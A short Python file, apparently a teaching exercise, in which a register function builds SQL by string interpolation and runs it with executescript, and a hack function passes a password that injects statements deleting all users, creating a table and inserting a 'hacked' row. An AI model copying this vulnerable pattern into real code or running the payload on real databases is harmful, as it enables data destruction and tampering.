import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('hw.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()


def hack() -> None:
    username: str = "I like"
    password: str = (
        """SQL Injection'); DELETE FROM table_users;
    CREATE TABLE IF NOT EXISTS table_users2 (id INTEGER PRIMARY KEY, username TEXT NOT NULL,
    password TEXT NOT NULL); INSERT INTO `table_users 2` (username, password) VALUES
    ('you database', 'is hacked'); --""")
    register(username, password)


